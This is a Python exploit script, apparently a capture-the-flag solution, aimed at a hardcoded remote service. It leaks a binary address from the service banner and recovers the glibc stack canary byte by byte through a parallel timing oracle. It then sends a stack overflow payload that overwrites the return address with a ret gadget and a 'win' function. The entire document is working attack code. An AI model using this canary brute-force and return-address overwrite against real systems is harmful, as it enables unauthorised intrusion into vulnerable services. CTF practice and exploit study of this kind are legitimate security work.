#!/usr/bin/env python3
import socket, struct, time, sys
from concurrent.futures import ThreadPoolExecutor

HOST, PORT = '168.110.219.59', 5004
p64 = lambda x: struct.pack('<Q', x)
WORKERS = 32

def conn():
    last = None
    for _ in range(10):
        try:
            s = socket.create_connection((HOST, PORT), timeout=8); s.settimeout(8)
            return s
        except OSError as e:
            last = e; time.sleep(0.3)
    raise last

def recv_banner(s):
    buf = b''; end = time.time() + 3
    while b'Buka brankas' not in buf and time.time() < end:
        try:
            d = s.recv(4096)
            if not d: break
            buf += d
        except socket.timeout:
            break
    leak = None
    for line in buf.split(b'\n'):
        if b'menang:' in line:
            try: leak = int(line.split(b'0x')[1].split()[0], 16)
            except: pass
    return leak

def measure(guess8):
    """returns (elapsed, leak) ; option 1 timing oracle"""
    for _ in range(6):
        try:
            s = conn()
            try:
                leak = recv_banner(s)
                s.sendall(b'1'); time.sleep(0.05)
                t0 = time.time(); s.sendall(guess8)
                resp = b''; end = time.time() + 6
                while time.time() < end:
                    d = s.recv(64)
                    if not d: break
                    resp += d
                    if b'salah' in resp or b'COCOK' in resp: break
                return time.time() - t0, leak
            finally:
                s.close()
        except OSError:
            time.sleep(0.3)
    return None, None

def mk(prefix, pos, b):
    g = bytearray(8); g[:pos] = prefix; g[pos] = b; return bytes(g)

class Restart(Exception): pass

def scan_pos(prefix, pos, base_leak):
    """test all 256 candidates in parallel; return best byte."""
    elapsed = {}
    def job(b):
        el, leak = measure(mk(prefix, pos, b))
        return b, el, leak
    with ThreadPoolExecutor(max_workers=WORKERS) as ex:
        for b, el, leak in ex.map(job, range(256)):
            if el is None:
                raise Restart(f"conn dead at pos {pos} b={b}")
            if leak != base_leak:
                raise Restart(f"leak changed {hex(base_leak)}->{hex(leak) if leak else None}")
            elapsed[b] = el
    # correct byte = max delay (extra ~60ms). take top-3, confirm sequentially clean.
    top = sorted(elapsed, key=lambda k: elapsed[k], reverse=True)[:4]
    # sequential clean confirm to beat parallel jitter
    best, bestv = None, -1
    for b in top:
        el, leak = measure(mk(prefix, pos, b))
        if leak != base_leak: raise Restart("leak changed during confirm")
        if el is not None and el > bestv:
            bestv, best = el, b
    return best, elapsed[top[0]], bestv

def brute():
    base = None
    for attempt in range(1, 9):
        try:
            s = conn(); base = recv_banner(s); s.close()
            print(f"[*] attempt {attempt}: locked base_leak(win)={hex(base)}", flush=True)
            canary = bytearray(b'\x00')          # glibc byte0 = 0x00
            for pos in range(1, 8):
                b, par_hi, conf = scan_pos(bytes(canary), pos, base)
                canary.append(b)
                print(f"[+] canary[{pos}]=0x{b:02x}  (par_top={par_hi*1000:.0f}ms conf={conf*1000:.0f}ms)  {bytes(canary).hex()}", flush=True)
            return bytes(canary), base
        except Restart as e:
            print(f"[!] restart detected ({e}); retrying whole brute...", flush=True)
            time.sleep(1)
    raise RuntimeError("gave up after retries")

def exploit(canary, base_leak):
    for _ in range(5):
        s = conn(); leak = recv_banner(s)
        if leak != base_leak:
            print(f"[!] base changed before exploit ({hex(base_leak)}->{hex(leak)}); re-bruting", flush=True)
            s.close(); return False, leak
        base_addr = leak - 0x1279
        win = leak
        ret_gadget = base_addr + 0x1268
        print(f"[*] exploiting: base={hex(base_addr)} win={hex(win)} canary={canary.hex()}", flush=True)
        s.sendall(b'2'); time.sleep(0.1)
        payload = b'A'*72 + canary + b'B'*8 + p64(ret_gadget) + p64(win)
        assert len(payload) <= 0x80
        s.sendall(payload)
        out = b''; end = time.time() + 6
        while time.time() < end:
            try: d = s.recv(4096)
            except socket.timeout: break
            if not d: break
            out += d
        s.close()
        print("=== SERVER RESPONSE ===\n" + out.decode(errors='replace'), flush=True)
        if b'Kunci' in out or b'BENAR' in out:
            return True, out
        time.sleep(0.5)
    return False, None

if __name__ == '__main__':
    t0 = time.time()
    while time.time() - t0 < 540:
        canary, base = brute()
        print(f"[*] FULL CANARY = {canary.hex()}", flush=True)
        ok, out = exploit(canary, base)
        if ok:
            print("[*] DONE", flush=True); break
        print("[!] exploit failed (likely restart); looping", flush=True)
